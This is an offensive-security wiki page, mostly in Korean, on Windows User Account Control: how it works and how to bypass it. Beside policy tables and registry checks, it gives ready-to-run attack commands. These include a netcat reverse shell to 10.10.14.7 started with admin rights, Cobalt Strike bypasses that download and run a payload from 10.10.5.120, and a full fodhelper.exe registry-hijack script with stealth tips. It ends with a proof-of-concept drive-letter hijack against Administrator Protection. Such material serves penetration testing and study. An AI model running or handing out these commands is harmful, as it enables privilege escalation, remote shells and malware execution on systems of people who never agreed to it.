# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 는 **권한 상승 작업에 대한 동의 프롬프트**를 제공하는 기능입니다. 애플리케이션은 서로 다른 `integrity` 레벨을 가지며, **높은 레벨**을 가진 프로그램은 **시스템을 손상시킬 수 있는 작업**을 수행할 수 있습니다. UAC가 활성화되어 있으면, 관리자가 명시적으로 해당 애플리케이션/작업에 관리자 수준 접근을 허용하지 않는 한 애플리케이션과 작업은 항상 **비관리자 계정의 보안 컨텍스트로 실행**됩니다. 이는 관리자를 의도치 않은 변경으로부터 보호하는 편의 기능이지만 보안 경계(security boundary)로 간주되지는 않습니다.

integrity 레벨에 대한 자세한 정보는 다음을 참고하세요:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC가 적용되면, 관리자 계정 사용자에게는 2개의 토큰이 부여됩니다: 일반 작업을 수행하기 위한 표준 사용자 토큰과 관리자 권한을 가진 토큰입니다.

이 [페이지](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 는 로그온 과정, 사용자 경험, UAC 아키텍처 등을 포함하여 UAC 동작을 상세히 설명합니다. 관리자는 로컬 수준(secpol.msc 사용)에서 보안 정책을 통해 UAC 동작을 구성하거나 Active Directory 도메인 환경에서 Group Policy Objects (GPO)를 통해 구성하고 배포할 수 있습니다. 다양한 설정은 [여기](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)에서 자세히 설명되어 있습니다. UAC에 대해 설정할 수 있는 Group Policy 설정은 10가지가 있으며, 아래 표는 추가 세부 정보를 제공합니다:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | 레지스트리 키                | 기본 설정                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 사용 안 함                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 사용 안 함                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 비-Windows 바이너리에 대해 동의 요청                            |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | 보안 데스크톱에서 자격 증명 입력 요구                          |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 사용(기본값: 홈) / 사용 안 함(기본값: 엔터프라이즈)            |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 사용 안 함                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 사용                                                           |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 사용                                                           |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 사용                                                           |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 사용                                                           |

### UAC Bypass Theory

일부 프로그램은 사용자가 **administrator 그룹**에 속해 있으면 **자동으로 autoelevated** 됩니다. 이러한 바이너리는 내부 _**Manifest**_에 _**autoElevate**_ 옵션이 _**True**_로 설정되어 있습니다. 또한 바이너리는 **Microsoft에 의해 서명**되어야 합니다.

많은 auto-elevate 프로세스는 **COM objects 또는 RPC servers를 통해 기능을 노출**하며, 이는 medium integrity(일반 사용자 수준 권한)로 실행되는 프로세스에서 호출될 수 있습니다. COM (Component Object Model)과 RPC (Remote Procedure Call)는 Windows 프로그램이 서로 다른 프로세스 간에 통신하고 기능을 실행하기 위해 사용하는 방법입니다. 예를 들어, **`IFileOperation COM object`**는 파일 작업(복사, 삭제, 이동)을 처리하도록 설계되었으며 프롬프트 없이도 자동으로 권한을 상승시킬 수 있습니다.

일부 검사는 프로세스가 **System32 디렉터리**에서 실행되었는지 확인하는 등의 방식으로 수행될 수 있으며, 예를 들어 **explorer.exe에 인젝션**하거나 System32에 위치한 다른 실행 파일로 인젝션하여 이 검사를 우회할 수 있습니다.

이러한 검사를 우회하는 또 다른 방법은 **PEB를 수정(modify the PEB)** 하는 것입니다. Windows의 모든 프로세스는 Process Environment Block(PEB)을 가지며, 여기에는 실행 파일 경로와 같은 프로세스에 대한 중요한 데이터가 포함됩니다. PEB를 수정하면 공격자는 자신의 악성 프로세스의 위치를 위조(spoof)하여 신뢰된 디렉터리(예: system32)에서 실행되는 것처럼 보이게 만들 수 있습니다. 이 위조된 정보는 COM object를 속여 사용자 프롬프트 없이 자동으로 권한을 상승시키게 만듭니다.

그 후 일부 공격자는 이러한 유형의 바이너리를 이용해 임의 코드를 **실행(execute arbitrary code)** 하는데, 이는 해당 코드가 **High level integrity 프로세스**에서 실행되기 때문입니다. 즉, UAC를 **우회(bypass)** 하여 **medium** 무결성 수준에서 **high**로 상승시킵니다.

바이너리의 _**Manifest**_를 확인하려면 Sysinternals의 도구 _**sigcheck.exe**_를 사용할 수 있습니다. (`sigcheck.exe -m <file>`) 또한 프로세스의 **integrity level**은 _Process Explorer_ 또는 _Process Monitor_ (Sysinternals)를 사용해 확인할 수 있습니다.

### Check UAC

UAC가 활성화되어 있는지 확인하려면:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
값이 **`1`**이면 UAC가 **활성화**되어 있고, 값이 **`0`**이거나 존재하지 않으면 UAC가 **비활성화**되어 있습니다.

그런 다음, 구성된 **어떤 레벨**을 확인하세요:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- 만약 **`0`**이면, UAC가 프롬프트를 표시하지 않습니다 (예: **비활성화됨**)
- 만약 **`1`**이면, 관리자는 고권한으로 바이너리를 실행하기 위해 **사용자 이름과 암호를 요구받습니다** (Secure Desktop에서)
- 만약 **`2`**(**Always notify me**)이면, 관리자가 고권한으로 무언가를 실행하려 할 때 UAC가 항상 확인을 요청합니다 (Secure Desktop에서)
- 만약 **`3`**이면 `1`과 같지만 Secure Desktop에서는 필요하지 않습니다
- 만약 **`4`**이면 `2`와 같지만 Secure Desktop에서는 필요하지 않습니다
- 만약 **`5`**(**기본값**)이면, Windows가 아닌 바이너리를 고권한으로 실행할 때 관리자의 확인을 요청합니다

그 다음, **`LocalAccountTokenFilterPolicy`** 값도 확인해야 합니다\
값이 **`0`**이면 **RID 500** 사용자(**built-in Administrator**)만 **UAC 없이 관리자 작업을 수행할 수 있으며**, 값이 `1`이면 **"Administrators" 그룹에 속한 모든 계정**이 수행할 수 있습니다.

마지막으로 **`FilterAdministratorToken`** 키 값을 확인하세요.\
값이 **`0`**(기본)인 경우 **built-in Administrator 계정은** 원격 관리 작업을 수행할 수 있고, 값이 **`1`**인 경우 built-in Administrator 계정은 `LocalAccountTokenFilterPolicy`가 `1`로 설정되지 않는 한 원격 관리 작업을 수행할 수 없습니다.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

이 모든 정보는 **metasploit** 모듈 `post/windows/gather/win_privs`를 사용해 수집할 수 있습니다.

또한 사용자 계정의 그룹과 무결성 수준(integrity level)을 확인할 수도 있습니다:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> 피해자에게 그래픽 접근 권한이 있다면, UAC bypass는 간단합니다 — UAC prompt가 나타날 때 단순히 "Yes"를 클릭하면 됩니다

UAC bypass는 다음과 같은 상황에서 필요합니다: **UAC가 활성화되어 있고, 프로세스가 medium integrity context에서 실행 중이며, 사용자가 administrators group에 속해 있는 경우**.

특히 UAC가 최고 보안 수준(Always)에 설정되어 있을 때는 다른 수준(Default)일 때보다 UAC를 우회하기가 **훨씬 더 어렵다**는 점을 유의해야 합니다.

### UAC 비활성화

만약 UAC가 이미 비활성화되어 (`ConsentPromptBehaviorAdmin`은 **`0`**) 있다면, 다음과 같이 **관리자 권한으로 reverse shell을 실행**(high integrity level)할 수 있습니다:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

만약 Administrators 그룹에 속한 사용자로 shell을 가지고 있다면, 로컬에서 SMB (file system)를 통해 **mount the C$** 공유를 새 드라이브로 마운트할 수 있으며 파일 시스템 내의 모든 것에 **access to everything inside the file system** (심지어 Administrator home folder) 접근할 수 있습니다.

> [!WARNING]
> **이 트릭은 더 이상 작동하지 않는 것 같습니다**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike 기술은 UAC가 최고 보안 수준으로 설정되어 있지 않을 때만 작동합니다.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**와 **Metasploit**에는 **UAC**를 **bypass**하기 위한 여러 모듈도 있습니다.

### KRBUACBypass

문서 및 도구: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME)은 여러 UAC bypass 익스플로잇의 **모음**입니다. 참고로 **compile UACME using visual studio or msbuild**해야 합니다. 컴파일하면 여러 실행 파일(예: `Source\Akagi\outout\x64\Debug\Akagi.exe`)이 생성되므로, 어떤 파일이 필요한지 **어떤 파일이 필요한지** 알아야 합니다.\

일부 bypasses는 다른 프로그램을 **prompt some other programs**하도록 만들어 **사용자**에게 무언가가 일어나고 있음을 **alert**할 수 있으니 **주의하세요**.
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

신뢰된 바이너리 `fodhelper.exe`는 최신 Windows에서 자동으로 권한 상승됩니다. 실행될 때, 아래의 사용자별 레지스트리 경로를 `DelegateExecute` 동사를 검증하지 않고 조회합니다. 그 위치에 명령을 심어두면 Medium Integrity 프로세스(사용자가 Administrators에 속함)가 UAC prompt 없이 High Integrity 프로세스를 생성할 수 있습니다.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell 단계(페이로드를 설정한 후 트리거):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- 현재 사용자가 Administrators의 멤버이고 UAC 레벨이 기본/관대한 경우(추가 제한이 있는 Always Notify는 제외) 작동합니다.
- 64비트 Windows에서 32비트 프로세스에서 64비트 PowerShell을 시작하려면 `sysnative` 경로를 사용하세요.
- Payload는 PowerShell, cmd 또는 EXE 경로 등 모든 명령이 될 수 있습니다. 은밀성을 위해 프롬프트 UI를 띄우지 않도록 하세요.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_가 작동해야 합니다)

### UAC Bypass with GUI

GUI에 접근할 수 있다면 UAC 프롬프트가 뜰 때 단순히 수락하면 되므로 별도의 우회가 필요 없습니다. 따라서 GUI 접근을 얻으면 UAC를 우회할 수 있습니다.

또한, 누군가가 사용하던 GUI 세션(예: RDP 통해)을 얻으면 관리자 권한으로 실행 중인 일부 도구에서 바로 cmd 등을 관리자 권한으로 실행할 수 있고 UAC 프롬프트가 다시 뜨지 않습니다. 예: [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). 이 방법이 더 은밀할 수 있습니다.

### Noisy brute-force UAC bypass

소음(탐지)을 신경 쓰지 않는다면 [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 같은 도구를 실행해 사용자가 수락할 때까지 권한 상승을 반복적으로 요청할 수 있습니다.

### Your own bypass - Basic UAC bypass methodology

UACME를 보면 대부분의 UAC 우회가 Dll Hijacking 취약점을 악용한다는 것을 알 수 있습니다(주로 악성 dll을 _C:\Windows\System32_에 쓰는 방식). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. autoelevate되는 바이너리를 찾으세요(실행 시 높은 무결성 수준으로 실행되는지 확인).
2. procmon을 사용해 DLL Hijacking에 취약할 수 있는 "**NAME NOT FOUND**" 이벤트를 찾으세요.
3. 쓰기 권한이 없는 보호된 경로(예: C:\Windows\System32)에 DLL을 써야 할 수도 있습니다. 이를 우회하기 위해:
1. **wusa.exe**: Windows 7,8 and 8.1. 이 도구는 고무결성 수준에서 실행되므로 CAB 파일의 내용을 보호된 경로에 추출할 수 있게 해줍니다.
2. **IFileOperation**: Windows 10.
4. 보호된 경로에 DLL을 복사하고 취약하며 autoelevated된 바이너리를 실행하는 스크립트를 준비하세요.

### Another UAC bypass technique

이는 autoElevated된 바이너리가 실행할 바이너리나 명령의 이름/경로를 레지스트리에서 읽으려 하는지 감시하는 방식입니다(특히 해당 바이너리가 이 정보를 HKCU 내부에서 찾는 경우 더 흥미롭습니다).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection”은 per-session `\Sessions\0\DosDevices/<LUID>` 맵을 갖는 shadow-admin 토큰을 사용합니다. 해당 디렉터리는 첫 `\??` 해석 시 `SeGetTokenDeviceMap`에 의해 지연 생성됩니다. 공격자가 shadow-admin 토큰을 SecurityIdentification 단계에서만 임퍼슨네이트하면 디렉터리는 공격자를 소유자로 하여 생성되어(`CREATOR OWNER` 상속), `\GLOBAL??`보다 우선하는 드라이브 문자 링크를 허용합니다.

**Steps:**

1. 저권한 세션에서 RAiProcessRunOnce를 호출해 프롬프트 없는 shadow-admin `runonce.exe`를 생성하세요.
2. 해당 프로세스의 primary token을 identification token으로 복제하고 `\??`를 열면서 이를 임퍼슨네이트하여 `\Sessions\0\DosDevices/<LUID>`가 공격자 소유로 생성되도록 강제하세요.
3. 그곳에 공격자가 제어하는 저장소를 가리키는 `C:` 심볼릭 링크를 생성하세요; 이후 해당 세션의 파일시스템 접근은 `C:`를 공격자 경로로 해석해 프롬프트 없이 DLL/파일 하이재킹을 가능하게 합니다.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 참고자료
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
